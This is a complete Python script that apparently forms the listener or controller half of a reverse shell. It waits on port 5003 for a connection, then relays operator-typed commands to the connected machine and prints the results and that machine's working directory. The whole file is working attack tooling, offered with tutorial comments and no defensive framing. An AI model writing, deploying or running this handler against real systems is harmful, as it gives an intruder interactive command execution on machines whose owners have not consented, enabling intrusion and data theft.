import socket, os

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create a socket object
s = socket.socket()
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    if command.lower() == "stop":
        break
    
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    print("output:", output)
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    
    print(results)

client_socket.close()
s.close()